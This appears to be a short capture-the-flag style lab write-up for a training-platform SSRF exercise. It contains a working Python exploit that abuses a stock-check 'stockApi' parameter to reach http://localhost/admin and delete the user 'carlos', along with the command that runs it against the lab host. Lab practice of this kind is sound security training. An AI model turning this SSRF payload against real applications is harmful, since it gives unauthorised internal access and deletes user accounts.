Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

Analysis:
localhost - http://localhost/
admin interface - http://localhost/admin
delete carlos - http:localhost/admin/delete?username=carlos

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    admin_ssrf_payload = 'http://localhost/admin'
    params2 = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)


if __name__ == "__main__":
    main()
```

RUN:
```bash
python3 ssrf-lab-01.py 'https://ac0b1f8d1ff73e428074793800860063.web-security-academy.net'
```
END!
